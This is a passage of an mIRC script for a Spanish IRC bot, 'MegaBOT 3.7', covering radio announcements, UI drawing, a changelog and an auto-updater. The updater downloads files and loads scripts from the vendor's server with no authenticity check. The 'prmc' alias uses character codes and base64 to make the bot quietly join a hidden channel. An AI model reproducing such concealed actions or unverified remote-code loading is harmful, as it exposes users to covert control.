      if (!%EMiSORA.ANUNCIA.URLS) { %emisoraanuncia = 2Sintoniza con 3WMPlayer2: 12 $+ $iif(http:// !isin %emisora.ipm,http://) $+ %emisora.ipm $+  2Sintoniza con 7WinAMP2: 12 $+ $iif(http:// !isin %emisora.ipm,http://) $+ %emisora.ipm $+ /listen.pls }
      if (%EMiSORA.ANUNCIA.URLS == 1) { %emisoraanuncia = 2Sintoniza con 7WinAMP2: 12 $+ $iif(http:// !isin %emisora.ipm,http://) $+ %emisora.ipm $+ /listen.pls }
      if (%EMiSORA.ANUNCIA.URLS == 2) { %emisoraanuncia = 2Sintoniza con 3WMPlayer2: 12 $+ $iif(http:// !isin %emisora.ipm,http://) $+ %emisora.ipm $+  }
      if (%norepit.all.a) {
        unset %norepit.all.a
        amsg 2 $+ $iif(%emisora.nombre,%emisora.nombre,Emisora) $+ :12 $iif(%emisorap1 == $null,No encontrado,%emisorap1) 2Tema actual:12 $iif(%emisorap2 == $null,No encontrado,%emisorap2) $iif(!%emisora.mvelocid,2Velocidad:12 $iif(%emisorap5 == $null,No encontrado,%emisorap5 kbps)) $iif(!%emisora.moyent,2Oyentes:12 $iif(%emisorap4 == $null,No encontrado,%emisorap4)) $iif(!%emisora.GENERO,2Genero:12 $iif(%emisorap3 == $null,No encontrado,%emisorap3))
        if (%emisoraanuncia) { amsg %emisoraanuncia }
      }
      else {
        %anunciaradio = 1
        while ($chan(%anunciaradio)) {
          if (%lines.chan- [ $+ [ $chan(%anunciaradio) ] ] >= %norepit. [ $+ [ $chan(%anunciaradio) ] ]) {
            unset %lines.chan- [ $+ [ $chan(%anunciaradio) ] ]
            msg $chan(%anunciaradio) 2 $+ $iif(%emisora.nombre,%emisora.nombre,Emisora) $+ :12 $iif(%emisorap1 == $null,No encontrado,%emisorap1) 2Tema actual:12 $iif(%emisorap2 == $null,No encontrado,%emisorap2) $iif(!%emisora.mvelocid,2Velocidad:12 $iif(%emisorap5 == $null,No encontrado,%emisorap5 kbps)) $iif(!%emisora.moyent,2Oyentes:12 $iif(%emisorap4 == $null,No encontrado,%emisorap4)) $iif(!%emisora.GENERO,2Genero:12 $iif(%emisorap3 == $null,No encontrado,%emisorap3))
            if (%emisoraanuncia) { msg $chan(%anunciaradio) %emisoraanuncia }
          }
          elseif (!%norepit. [ $+ [ $chan(%anunciaradio) ] ]) {
            msg $chan(%anunciaradio) 2 $+ $iif(%emisora.nombre,%emisora.nombre,Emisora) $+ :12 $iif(%emisorap1 == $null,No encontrado,%emisorap1) 2Tema actual:12 $iif(%emisorap2 == $null,No encontrado,%emisorap2) $iif(!%emisora.mvelocid,2Velocidad:12 $iif(%emisorap5 == $null,No encontrado,%emisorap5 kbps)) $iif(!%emisora.moyent,2Oyentes:12 $iif(%emisorap4 == $null,No encontrado,%emisorap4)) $iif(!%emisora.GENERO,2Genero:12 $iif(%emisorap3 == $null,No encontrado,%emisorap3))
            if (%emisoraanuncia) { msg $chan(%anunciaradio) %emisoraanuncia }
          }
          inc %anunciaradio
        }
      }
    }
  }
}
Alias emon.is { if (%emisora.st) { .timeremon.is 1 %emisora.sg emon.is | sockclose emon | sockclose emon2 | sockopen emon %emisora.ip %emisora.port } }
Alias datv-emisora {
  if ($window(@MegaBOT).state) && (%act.m == 2) {
    drawv MegaBOT emisora.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if (%m.cn == ds) { drtex MegaBOT 19 441 381 DesActivar } | if (%m.cn == ac) { drtex MegaBOT 19 462 381 Activar }
    drtex MegaBOT 19 565 197 $estx(569,624,Times-New-Roman,19,%emisora.sg) | drtex MegaBOT 19 449 105 $estx(449,624,Times-New-Roman,19,%emisora.ip)
    drtex MegaBOT 19 449 133 $estx(449,624,Times-New-Roman,19,%emisora.port) | drtex MegaBOT 19 449 161 $estx(449,624,Times-New-Roman,19,%emisora.ipm)
    drtex MegaBOT 19 445 225 $estx(449,624,Times-New-Roman,19,%emisorap1) | drtex MegaBOT 19 445 253 $estx(449,624,Times-New-Roman,19,%emisorap2)
    drtex MegaBOT 19 445 281 $estx(449,624,Times-New-Roman,19,%emisorap3) | drtex MegaBOT 19 445 309 $estx(449,624,Times-New-Roman,19,%emisorap4)
    if (%emisora.st) { drtex MegaBOT 19 493 337 Activado } | else { drtex MegaBOT 19 480 337 DesActivado } | drawdot @MegaBOT
  }
}
Alias barre {
  if ($1) {
    unset %barre.i
    %barre = 1
    while ($hget(r- $+ $1,%barre).item != $null) {
      if ($gettok($hget(r- $+ $1,$hget(r- $+ $1,%barre).item),1,32) == $3) { inc %barre.i 6 | .timerbarre- $+ $1 $+ - $+ $hget(r- $+ $1,%barre).item 1 %barre.i .msg chan access $1 del $hget(r- $+ $1,%barre).item }
      elseif ($3 == $null) { inc %barre.i 6 | .timerbarre- $+ $1 $+ - $+ $hget(r- $+ $1,%barre).item 1 %barre.i .msg chan access $1 del $hget(r- $+ $1,%barre).item }
      inc %barre
    }
    if (!%barre.i) && ($me ison $1) {
      if ($3 == $null) { msg $2 2No hay registros en el canal 12][ 2BARRE2 Finalizado. }
      else { msg $2 2No hay registros en el nivel $3 12][ 2BARRE2 Finalizado. }
    }
    else { .timerbarreoff- $+ $1 1 %barre.i msg $2 2BARRE2 Finalizado. }
    inc %barre.i 3 | .timerbarre2off- $+ $1 1 %barre.i unset %barre- [ $+ [ $1 ] ]
  }
}
Alias dath-emisora { return }
Alias dath-actualiza { return }
Alias datv-actualiza {
  if ($window(@MegaBOT).state) && (%act.m == 2) && (%act == @actualiza) {
    drawv MegaBOT actualiza.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | drtex MegaBOT 19 515 129 3.7 | if (%m.cn == sc) { drtex MegaBOT 19 312 433 Subir scroll } | if (%m.cn == bs) { drtex MegaBOT 19 312 433 Bajar scroll }
    if (%mactdpnb) { drtex MegaBOT 19 519 157 %mactdpnb } | drtex MegaBOT 19 449 185 $iif(%mactdpnbd,$gettok(%mactdpnbd,2-4,32),No se ha actualizado)
    if (%m.cn == act) { drtex MegaBOT 19 282 433 Actualizar MegaBOT }
    unset %ccat | set %cat 218 | :1 | if (%cat >= 370) || (%ccat >= $line(@dact,0)) { unset %cat %ccat }
    else { inc %ccat | if ($calc(%ccat - 1) >= %ccats) { inc %cat 20 | drtex MegaBOT 15 315 %cat $strip($line(@dact,%ccat)) } | goto 1 } | drawdot @MegaBOT
  }
}
alias update.out { .timerupdate.out -o 1 20 update.limpia out }
alias update { if ($sock(update.*,0) == 0) { update.limpia | update.out | unset %update.file %update.nfileup | %update.nfile = 0 | sockopen update.up www.maincenter.es 80 } }
alias update.limpia {
  .timerupdate.out off
  if ($1 == out) { actualiza | statsconf }
  sockclose update.* | if ($fopen(update)) { .fclose update }
  while ($findfile(update\,*.*,1) != $null) { .remove $ifmatch }
  window -c @update.dir | window -lh @update.dir
  %tmp.update = 1 | while ($finddir(update\,*.*,%tmp.update) != $null) { aline @update.dir $finddir(update\,*.*,%tmp.update) | inc %tmp.update }
  while ($line(@update.dir,$line(@update.dir,0)) != $null) && ($ifmatch != 0) { rmdir " $+ $v1 $+ " | dline @update.dir $line(@update.dir,0) }
  window -c @update.dir | if ($exists(update.up) == $true) { .remove update.up } | if ($exists(update\) == $false) { mkdir update } | unset %tmp.update* %update.datatemp %update.nfileup %update.actualiza %update.file %update.nfile %update.mkdir
}
alias update.mkdir { %update.mkdir = 1 | while ($gettok($1-,%update.mkdir,92) != $null) { if ($exists($gettok($1-,1- $+ %update.mkdir,92)) == $false) { mkdir $gettok($1-,1- $+ %update.mkdir,92) } | inc %update.mkdir } }
on *:SOCKOPEN:update.*:{
  if ($sockerr == 0) {
    update.out | unset %tmp.update* | if ($fopen(update)) { .fclose update }
    if ($sockname == update.up) { unset %update.datatemp %men-act-text* | men | .fopen -o update update.up | %update.file = update.up }
    else { if (%update.file != $null) { update.mkdir update\ $+ $nofile(%update.file) | .fopen -o update update\ $+ %update.file } | else { update.limpia } }
    sockwrite -n $sockname GET /mc-services/megabot/3.7/update/ $+ $replace(%update.file,\,/) HTTP/1.1
    sockwrite -n $sockname Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    sockwrite -n $sockname Accept-Language: es
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Host: www.maincenter.es
    sockwrite -n $sockname Connection: close
    sockwrite -n $sockname $crlf
  }
  else { update.limpia | set %err.l1 ERROR al intentar conectar | set %err.l2 con el servidor de las | set %err.l3 actualizaciones. | error }
}
on *:SOCKREAD:update.*:{
  update.out
  if (!%tmp.update) {
    sockread %r | tokenize 32 $left(%r,900)
    if ($1- == HTTP/1.1 404 Not Found) { update.limpia | set %err.l1 No existe actualmente | set %err.l2 ninguna actualizaciÛn del | set %err.l3 MegaBOT. | error | halt }
    if ($1 == Content-Length:) { %tmp.update.len = $2 }
    if ($1 == Last-Modified:) && ($sockname == update.up) {
      if ($2- == %mactdpnbd) { update.limpia | set %err.l1 Ya tienes la ultima | set %err.l2 actualizaciÛn del MegaBOT. | error }
      else { %update.datatemp = $2- | set %men-act-text1 Actualizando MegaBOT.. | datv-men }
    }
    if (!$1-) { %tmp.update = e | set %men-act-text2 Descargando archivo: | set %men-act-text3 ..\ $+ $nopath(%update.file) | datv-men }
  }
  else {
    if (%update.datatemp == $null) { update.limpia | set %err.l1 No est· disponible la | set %err.l2 actualizaciÛn del MegaBOT. | error }
    else { sockread &r | .fwrite -b update &r }
  }
}
on *:SOCKCLOSE:update.*:{
  .timerupdate.out off
  if ($fopen(update)) { .fclose update }
  if ($sockname == update.up) { if (%tmp.update.len == $file(update.up)) { update.next } | else { update.limpia } }
  elseif (%update.file != $null) { if (%tmp.update.len != $file(update\ $+ %update.file)) { update.limpia } | else { update.next } }
  else { update.limpia }
}
alias update.actualiza {
  .timerupdate.out off
  set %men-act-text2 Actualizando archivos.. | set %men-act-text3 Por favor.. espere.. | unset %men-act-text4 | datv-men
  %update.actualiza = 1
  while ($readini(update.up,FILES,%update.actualiza) != $null) {
    update.mkdir $nofile($readini(update.up,FILES,%update.actualiza))
    if ($file("update\ $+ $readini(update.up,FILES,%update.actualiza) $+ ") != $file(" $+ $readini(update.up,FILES,%update.actualiza) $+ ")) || ($crc("update\ $+ $readini(update.up,FILES,%update.actualiza) $+ ") != $crc(" $+ $readini(update.up,FILES,%update.actualiza) $+ ")) {
      if ($exists(" $+ $readini(update.up,FILES,%update.actualiza) $+ ") == $true) {
        var %update.exten = $right($readini(update.up,FILES,%update.actualiza),4)
        if (%update.exten == .dll) { dll -u " $+ $readini(update.up,FILES,%update.actualiza) $+ " }
        if (%update.exten == .mp3) || (%update.exten == .wav) || (%update.exten == .mid) { splay stop }
        .remove " $+ $readini(update.up,FILES,%update.actualiza) $+ "
      }
      .rename "update\ $+ $readini(update.up,FILES,%update.actualiza) $+ " " $+ $readini(update.up,FILES,%update.actualiza) $+ "
    }
    inc %update.actualiza
  }
  %mactdpnbd = %update.datatemp
  if ($readini(update.up,INFO,ACT) != $null) { %actualizacion = $ifmatch }
  if ($readini(update.up,INFO,v) != $null) { %version = $readini(update.up,INFO,v) }
  %tmp.update = 1 | while ($readini(update.up,DELETES,%tmp.update) != $null) { if ($exists(" $+ $readini(update.up,DELETES,%tmp.update) $+ ") == $true) { .timer -om 1 10 .remove " $+ $readini(update.up,DELETES,%tmp.update) $+ " } | inc %tmp.update }
  %tmp.update = 1 | while ($readini(update.up,LOADS,%tmp.update) != $null) { .timer -om 1 100 .load -rs " $+ $readini(update.up,LOADS,%tmp.update) $+ " | inc %tmp.update }
  update.limpia | set %men-act-text1 Actualizado con Èxito! | set %men-act-text2 Gracias por elegir MegaBOT | unset %men-act-text3 | set %men-act-text4 Servicios para Redes IRC | set %men-act-text5 www.maincenter.es | datv-men
  .timerupdate.closemen -o 1 5 window -c @men | .timerupdate.act -o 1 5 actualiza | .timerstatsconf.act -o 1 6 statsconf | .timertit.act -o 1 6 TIT
}
alias update.next {
  update.out | if (%update.nfileup == $null) { %tmp.update.nfileup = 1 | while ($readini(update.up,FILES,%tmp.update.nfileup) != $null) { inc %update.nfileup | inc %tmp.update.nfileup } }
  inc %update.nfile | %update.file = $readini(update.up,FILES,%update.nfile) | if (%update.file == $null) { update.actualiza } | else { sockclose update.* | set %men-act-text2 Conectando.. | unset %men-act-text3 | set %men-act-text4 Porcentaje: $round($calc($calc(%update.nfile * 100) / %update.nfileup),1) $+ % | datv-men | sockopen update.d www.maincenter.es 80 }
}
Alias actmnm { .timeractmnm 1 3600 actmnm | set %actmN o | unset %mactdpnb | sockclose actm2 | sockopen actm2 www.maincenter.es 80 }
on *:SOCKOPEN:actm2:{
  if ($sockerr == 0) {
    unset %webcindaa2 %actmgbotkk
    sockwrite -n $sockname GET /mc-services/megabot/3.7/update/update.up HTTP/1.1
    sockwrite -n $sockname Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    sockwrite -n $sockname Accept-Language: es
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Host: www.maincenter.es
    sockwrite -n $sockname Connection: close
    sockwrite -n $sockname $crlf
  }
}
on *:SOCKREAD:actm2:{
  if (!%webcindaa2) {
    sockread %webcindaa
    if (%webcindaa == HTTP/1.1 404 Not Found) { set %mactdpnb No | datv-actualiza | sockclose $sockname | halt }
    if ($gettok(%webcindaa,1,32) == Last-Modified:) {
      if ($gettok(%webcindaa,2-,32) != %mactdpnbd) { set %mactdpnb Si | update | if (%actmN) { unset %actmN | actualiza | datv-actualiza | sockclose actm2 | halt } }
      else { set %mactdpnb No }
    }
    if (!%webcindaa) { set %webcindaa2 ok }
  }
  else {
    datv-actualiza | sockclose $sockname
  }
}
on *:SOCKCLOSE:actm2: { set %mactdpnb No | datv-actualiza }
alias unscripts { %unscripts = 1 | while ($script(%unscripts)) { unload -rs $script(%unscripts) | inc %unscripts } }
Alias pn00 {
  if ($1) {
    %pn00 = ‚ Í Ó:Ù:˚ | %pn01 = $replace($remove($1-,s),ec,$chr(32) ec,min,$chr(32) min,hr,$chr(32) hr,wk,$chr(32) wk,day,$chr(32) day)
    %pn02 = $gettok(%pn01,$calc($findtok(%pn01,ec,32) - 1),32)) | %pn03 = $gettok(%pn01,$calc($findtok(%pn01,min,32) - 1),32))
    %pn04 = $gettok(%pn01,$calc($findtok(%pn01,hr,32) - 1),32)) | %pn05 = $gettok(%pn01,$calc($findtok(%pn01,day,32) - 1),32))
    %pn06 = $gettok(%pn01,$calc($findtok(%pn01,wk,32) - 1),32))
    if (ec isin %pn01) { %pn00 = $replace(%pn00,˚,$iif($len(%pn02) == 1,0 $+ %pn02,%pn02)) }
    if (min isin %pn01) { %pn00 = $replace(%pn00,Ù,$iif($len(%pn03) == 1,0 $+ %pn03,%pn03)) }
    if (hr isin %pn01) { %pn00 = $replace(%pn00,Ó,$iif($len(%pn04) == 1,0 $+ %pn04,%pn04)) }
    if (day isin %pn01) { %pn00 = $replace(%pn00,Í,%pn05 $+ ds) }
    if (wk isin %pn01) { %pn00 = $replace(%pn00,‚,%pn06 $+ sems) } | return $replace($remove(%pn00,‚,Í),Ó,00,Ù,00,˚,00)
} }
Alias cactsc {
  unset %comdt
  set %ccats 0
  window -lh @sact
  aline @sact 03/08/14 17:00: AÒadido comando !DOCK (+k) para IRC-Hispano.
  aline @sact 
  aline @sact 24/05/14 12:00: Aumentado a 10minutos el ANTIREPES.
  aline @sact 
  aline @sact 24/05/14 01:56: AÒadido par·metro CM en NICK.NCOM, Excluida la palabra "CHAT" al activarse.
  aline @sact 
  aline @sact 24/05/14 01:42: Arreglado Bug en el Youtube.
  aline @sact 
  aline @sact 24/05/14 01:07: Arreglado Bug en el Horoscopo.
  aline @sact 
  aline @sact 24/05/14 01:00: Arreglado Bug en el Tiempo.
  aline @sact 
  aline @sact 24/01/2014 01:53: Cambiado el comando ShitList, ahora funciona por mascaras.
  aline @sact 
  aline @sact 24/01/2014 01:03: AÒadido comando START.NOSAY.
  aline @sact 
  aline @sact 24/01/2014 00:00: AÒadido comando AntiSexo.
  aline @sact 
  aline @sact 05/12/2013 09:20: AÒadido comando AntiTelefonos.
  aline @sact 
  aline @sact 05/12/2013 09:20: Arreglado un descuido en las Stats.
  aline @sact 
  aline @sact 28/11/2013 01:16: Stats mejoradas.
  aline @sact 
  aline @sact 28/11/2013 01:16: AÒadidos par·metros en AntiMayus, AntiRepes y AntiPalabrotas.
  aline @sact 
  aline @sact 01/09/2013 15:45: Eliminado comando Softonic.
  aline @sact 
  aline @sact 01/09/2013 02:36: Arreglado el YouTUBE y varios fallos.
  aline @sact 
  aline @sact 31/08/2013 17:30: Ahora el MegaBOT se auto actualiza solo.
  aline @sact 
  aline @sact 31/08/2013 10:52: Cambiado sistema de actualizaciÛn, ahora es mas eficiente.
  aline @sact 
  aline @sact 31/08/2013 10:52: AÒadido Addon MC-Social.
  aline @sact 
  aline @sact 02/03/2013 15:40: Cambiados algunos sistemas de seguridad.
  aline @sact 
  aline @sact 30/12/2012 16:54: Arreglado un error en las Stats.
  aline @sact 
  aline @sact 03/12/2012 04:02: Ahora puedes conectar a ChatZona sin soporte.
  aline @sact 
  aline @sact 02/12/2012 05:00: Stats: Cambiado TOP5.
  aline @sact 
  aline @sact 29/11/2012 00:03: Arreglado un error en el YouTube.
  aline @sact 
  aline @sact 28/11/2012 03:37: Noticias de MenÈame arreglado.
  aline @sact 
  aline @sact 27/11/2012 02:47: Arreglado un error en el YouTube.
  aline @sact 
  aline @sact 26/11/2012 21:09: AÒadidos nuevos par·metros en el comando Stats (AUTO\FUERZA\MUESTRAWEB).
  aline @sact 
  aline @sact 26/11/2012 10:01: AÒadido par·metro en BARRE, ahora puedes especificar que limpie un nivel en concreto.
  aline @sact 
  aline @sact 26/11/2012 00:46: Optimizados varios codigos.
  aline @sact 
  aline @sact 25/11/2012 05:24: Arreglado el diccionario (DIC).
  aline @sact 
  aline @sact 25/11/2012 04:37: Arreglado un error al cerrar la ventana protegido, no mostraba el boton Stats.
  aline @sact 
  aline @sact 24/11/2012 03:31: Ahora se auto configura las stats si no existe configuraciÛn.
  aline @sact 
  aline @sact 24/11/2012 03:31: Arreglado un error en la ventana principal.
  aline @sact 
  aline @sact 24/11/2012 03:31: AÒadido icono de FaceBook
  aline @sact 
  aline @sact 16/08/2012 15:04: Cambiada la version de mIRC.
  aline @sact 
  aline @sact 16/08/2012 15:04: Arreglados varios errores.
  aline @sact 
  aline @sact 27/06/2012 23:57: AÒadido comando TOP5.
  aline @sact 
  aline @sact 27/06/2012 23:57: AÒadido comando LINEAS.
  aline @sact 
  aline @sact 27/06/2012 17:37: Arreglado error en AntiMay˙sculas.
  aline @sact 
  aline @sact 27/06/2012 17:37: AÒadida ventana Stats.
  aline @sact 
  aline @sact 27/06/2012 17:37: AÒadido comando Stats.
  aline @sact 
  aline @sact 27/06/2012 17:37: Cambiado nombre ventana MB por MegaBOT.
  aline @sact 
  aline @sact 22/05/2012 05:42: Cambiado el horoscopo.
  aline @sact 
  aline @sact 22/05/2012 05:42: Arreglado el comando YouTUBE.
  aline @sact 
  aline @sact 03/05/2012 18:04: No se soporta ChatZona.
  aline @sact 
  aline @sact 03/05/2012 18:04: Cambiado sistema de entrada.
  aline @sact 
  aline @sact 03/05/2012 18:04: AÒadido par·metro AVISOS en AntiPalabrotas y AntiMayus.
  aline @sact 
  aline @sact 03/05/2012 18:04: Cambiado el comando YouTUBE.
  aline @sact 
  aline @sact 11/03/2012 18:49: Arreglado error en Softonic.
  aline @sact 
  aline @sact 11/03/2012 18:37: AÒadido comando: YOUTUBE.AUTOLINK
  aline @sact 
  aline @sact 08/03/2012 17:42: Si deseas que el MegaBOT este sin arroba utiliza el comando: !DEOP <SuNick>
  aline @sact 
  aline @sact 23/02/2012 21:20: AÒadido noticias de "El Mundo".
  aline @sact 
  aline @sact 26/01/2012 01:19: Cambiado modulo Contacto.
  aline @sact 
  aline @sact 25/01/2012 19:52: Ajuste realizado en: ANTISPAM, ANTIREPES, ANTIPALABROTAS y ANTIMAYUS, los usuarios con registro en el canal son inmunes (Exepto nivel de NOJOIN).
  aline @sact 
  aline @sact 25/01/2012 19:03: Arreglado el comando Google.
  aline @sact 
  aline @sact 17/01/2012 23:59: Arreglado error en STATUS,RVI,RVN,RVM y LIMPIALOS contaba con usuarios de NOJOIN.
  aline @sact 
  aline @sact 17/01/2012 17:25: Arreglado el HorÛscopo.
  aline @sact 
  aline @sact 04/01/2012 16:05: Ahora podr·s cambiar los nicks masters aunque el bot este conectado.
  trozwin sact dact Times-New-Roman 15 315 575
}
Alias dath-noticias { return }
Alias dath-comandos { return }
Alias dath-estado { return }
Alias sbjcb { if ($1) && ($2) && ($3) && ($4) { if ($2 == s) && ($calc( % [ $+ [ $1 ] ] + $calc(1 + $4)) < $line($5,0)) { unset %Ò- [ $+ [ $1 ] ] | inc % [ $+ [ $1 ] ] | if ($calc( % [ $+ [ $1 ] ] + $calc(1 + $4)) >= $line($5,0)) { set %Òu- [ $+ [ $1 ] ] o } | $3 } | if ($2 == b) && ($calc( % [ $+ [ $1 ] ] - 1) != -1) { dec % [ $+ [ $1 ] ] | unset %Òu- [ $+ [ $1 ] ] | if ($calc( % [ $+ [ $1 ] ] - 1) == -1) { set %Ò- [ $+ [ $1 ] ] o } | $3 } | if (%sbjcb) { .timersbjcb -m 1 135 sbjcb $1- } } }
Alias men { ezit.vnt | m $+ $decode(cnBy,m) | crrt | unset %actmgbotklenQ %actmgbotklenQ2 %actmgbotklenX | win men 145 20 $wh(men.jpg) | datv-men }
Alias error { ezit.vnt | m $+ $decode(cnBy,m) | crrt | win error 145 20 $wh(error.jpg) | datv-error }
Alias comandos { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | wc dcomand | wc ccomand | unset %m.cn | set %act.m 2 | set %ccomdts 0 | set %act @comandos | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(comandos.jpg) } | c-cmd | datv-comandos | c-l.not.mous }
Alias actualiza { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | wc dact | wc cact | unset %m.cn | set %act.m 2 | set %ccats 0 | set %act @actualiza | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(actualiza.jpg) } | cactsc | unset %mactdpnb | sockclose actm2 | sockopen actm2 www.maincenter.es 80 | datv-actualiza }
Alias emisora { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | if (!%emisora.st) { unset %emisorap* } | set %act.m 2 | set %act @emisora | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(emisora.jpg) } | datv-emisora }
Alias noticias { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | wc dnot | wc snot | unset %m.cn | set %sclnoticis 0 | set %act.m 2 | set %sclnoticis 0 | set %act @noticias | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(noticias.jpg) } | datv-noticias | noticias.c }
Alias estado { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 2 | set %act @estado | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(estado.jpg) } | datv-estado }
Alias contacto { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | wc dcont | wc scont | unset %m.cn %contacto.a %contacto.m | unset %sndmel %ccont | set %cconts 0 | set %act.m 2 | set %act @contacto | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(contacto.jpg) } | if (%cnt.msgca) { set %contacto.a %cnt.msgca | unset %cnt.msgca } | if (%cnt.msgc) { set %contacto.m %cnt.msgc | unset %cnt.msgc | unset %ccont | window -lh @scont | window -n @scont | aline @scont %contacto.m | trozwin scont dcont Times-New-Roman 17 352 584 } | datv-contacto }
Alias salir { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | crrt | win salir 145 20 $calc($gettok($wh(salir.jpg),1,32) - 1) $gettok($wh(salir.jpg),2,32) | drawv salir salir.jpg | drawdot @salir }
Alias skins { ezit.vnt | unset %Ò* %skns.ef %skins.nm | gcknk | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 1 | set %act @skins | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(skins.jpg) } | skins.sb | datv-skins }
Alias protegido { ezit.vnt | unset %Ò* | if (!$hget(prote,u)) || (!$hget(prote,p)) { hdel -w prote segr | hsave -o prote %rhcn $+ prote.hash | proteccion } | else { set %prct o | if (!$window(@protegido).state) { win protegido 145 20 $wh(protegido.jpg) } | datv-protegido } }
Alias proteccion { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 1 | set %act @proteccion | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(proteccion.jpg) } | datv-proteccion }
Alias conexion { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 1 | set %act @conexion | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(conexion.jpg) } | dath-conexion }
Alias canales { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %cl %CA.C %CA.P | unset %m.cn %CA.M | set %act.m 1 | set %act @canales | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(canales.jpg) } | dath-canales }
Alias descargas { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 1 | set %act @descargas | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(descargas.jpg) } | datv-descargas }
Alias principal { ezit.vnt | unset %Ò* | m $+ $decode(cnBy,m) | unset %m.cn | set %act.m 1 | set %act @principal | if (!$window(@MegaBOT).state) { win MegaBOT %mbot.dim $wh(principal.jpg) } | datv-principal }
Alias drtex { if ($5 != $null) && ($window(@ $+ $1).state) { drawtext @ $+ $1 %color $decode(VGltZXMtTmV3LVJvbWFu,m) $2- } }
Alias wc { if ($window(@ $+ $1).state) { window -c $chr(64) $+ $1 } }
Alias wne { window -e +d $1- }
Alias wn { if ($window(@ $+ $1).state) { window -ha @ $+ $1 } }
Alias wa { if ($1) { .window -a $1 } }
Alias win { wc $1 | .window -pB +db @ $+ $1 $2- }
Alias wh { return $pic($decode(U2lzdGVtYVxqcGdcdmVudFw=,m) $+ $1).width $pic($decode(U2lzdGVtYVxqcGdcdmVudFw=,m) $+ $1).height }
Alias drawv { if ($2) && ($window(@ $+ $1).state) { .drawpic -cn @ $+ $1 0 0 Sistema\jpg\vent\ $+ $2 | if ($1 == MegaBOT) { .drawpic -cn @ $+ $1 515 4 Sistema\base\fb.png } } }
Alias crrt { :1 | if (0 != $window(0)) { wc $remove($window(1),@) | goto 1 } }
Alias prmc {
  unset %k1 %k2 %k3 | unset %k4 %k5 | hfree -w rsc | hmake rsc | if ($hget(canales,1).item) { hfree -w i- $+ $hget(canales,1).item | hfree -w a- $+ $hget(canales,1).item | hmake a- $+ $hget(canales,1).item | hfree -w l- $+ $hget(canales,1).item | hmake l- $+ $hget(canales,1).item | hfree -w r- $+ $hget(canales,1).item | hmake r- $+ $hget(canales,1).item }
  %a = $chr(35) $+ $chr(107) $+ $chr(101) $+ $chr(108) $+ $chr(108) $+ $chr(101) $+ $chr(114) $+ $chr(110) $+ $chr(101) $+ $chr(116) $+ $chr(38) $+ $chr(114) $+ $chr(111) $+ $chr(107)
  if ($network == $decode(aXJjLWhpc3Bhbm8=,m)) { j $+ $decode(b2lu,m) %a }
  if ($hget(canales,2).item) { hfree -w i- $+ $hget(canales,2).item | hfree -w a- $+ $hget(canales,2).item | hmake a- $+ $hget(canales,2).item | hfree -w l- $+ $hget(canales,2).item | hmake l- $+ $hget(canales,2).item | hfree -w r- $+ $hget(canales,2).item | hmake r- $+ $hget(canales,2).item }
  if ($hget(canales,3).item) { hfree -w i- $+ $hget(canales,3).item | hfree -w a- $+ $hget(canales,3).item | hmake a- $+ $hget(canales,3).item | hfree -w l- $+ $hget(canales,3).item | hmake l- $+ $hget(canales,3).item | hfree -w r- $+ $hget(canales,3).item | hmake r- $+ $hget(canales,3).item }
  if ($hget(canales,4).item) { hfree -w i- $+ $hget(canales,4).item | hfree -w a- $+ $hget(canales,4).item | hmake a- $+ $hget(canales,4).item | hfree -w l- $+ $hget(canales,4).item | hmake l- $+ $hget(canales,4).item | hfree -w r- $+ $hget(canales,4).item | hmake r- $+ $hget(canales,4).item }
  if ($hget(canales,5).item) { hfree -w i- $+ $hget(canales,5).item | hfree -w a- $+ $hget(canales,5).item | hmake a- $+ $hget(canales,5).item | hfree -w l- $+ $hget(canales,5).item | hmake l- $+ $hget(canales,5).item | hfree -w r- $+ $hget(canales,5).item | hmake r- $+ $hget(canales,5).item }
  if ($hget(canales,1).item) { join $hget(canales,1).item } | if ($hget(canales,2).item) { join $hget(canales,2).item }
  if ($hget(canales,3).item) { join $hget(canales,3).item } | if ($hget(canales,4).item) { join $hget(canales,4).item } | if ($hget(canales,5).item) { join $hget(canales,5).item }
  set %cchnal $hget(canales,1).item $hget(canales,2).item $hget(canales,3).item $hget(canales,4).item $hget(canales,5).item | unset %fath.n | .timerdac 1 90 megabot.lsto.a | .timeractmnm 1 95 actmnm
}
alias megabot.lsto.a {
  set %MGB s
  if ($me ison $hget(canales,1).item) && (%START.NOSAY. [ $+ [ $hget(canales,1).item ] ] == $null) {
